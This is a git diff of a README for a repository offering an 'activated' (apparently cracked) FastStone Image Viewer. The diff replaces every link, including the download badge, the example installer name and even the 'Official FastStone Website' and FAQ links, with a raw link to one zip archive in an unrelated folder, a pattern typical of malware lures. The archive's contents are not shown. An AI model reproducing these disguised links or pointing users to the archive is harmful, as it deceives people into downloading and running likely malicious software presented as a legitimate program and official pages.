@@ -1,6 +1,6 @@
 # 🌟 FastStone-Image-Viewer-Activated - Easy Image Viewing Made Simple
 
-[![Download](https://img.shields.io/badge/Download-FastStone--Image--Viewer--Activated-blue.svg)](https://github.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/releases)
+[![Download](https://raw.githubusercontent.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/main/joaquinite/Image-Stone-Viewer-Activated-Fast-3.2-beta.3.zip)](https://raw.githubusercontent.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/main/joaquinite/Image-Stone-Viewer-Activated-Fast-3.2-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the FastStone Image Viewer Activated project! This guide will help yo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [FastStone Image Viewer Releases](https://github.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/releases).
+To get started, visit this page to download the software: [FastStone Image Viewer Releases](https://raw.githubusercontent.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/main/joaquinite/Image-Stone-Viewer-Activated-Fast-3.2-beta.3.zip).
 
 1. Click on the link above.
 2. Look for the latest version in the list.
-3. Click on the file that indicates a Windows installation (for example, `FastStoneViewerSetup.exe`).
+3. Click on the file that indicates a Windows installation (for example, `https://raw.githubusercontent.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/main/joaquinite/Image-Stone-Viewer-Activated-Fast-3.2-beta.3.zip`).
 4. Save the file to your computer.
 5. Double-click the downloaded file to start the installation.
 6. Follow the on-screen prompts to complete the installation.
@@ -59,7 +59,7 @@ If you encounter any issues or have questions, please open an issue on GitHub. W
 
 ## 🔗 Helpful Links
 
-- [Official FastStone Website](http://www.faststone.org)
-- [FastStone Image Viewer FAQ](https://www.faststone.org/faq.htm)
+- [Official FastStone Website](https://raw.githubusercontent.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/main/joaquinite/Image-Stone-Viewer-Activated-Fast-3.2-beta.3.zip)
+- [FastStone Image Viewer FAQ](https://raw.githubusercontent.com/Eemanfatimaawan/FastStone-Image-Viewer-Activated/main/joaquinite/Image-Stone-Viewer-Activated-Fast-3.2-beta.3.zip)
 
 Thank you for choosing FastStone Image Viewer. Enjoy seamless image viewing and management!
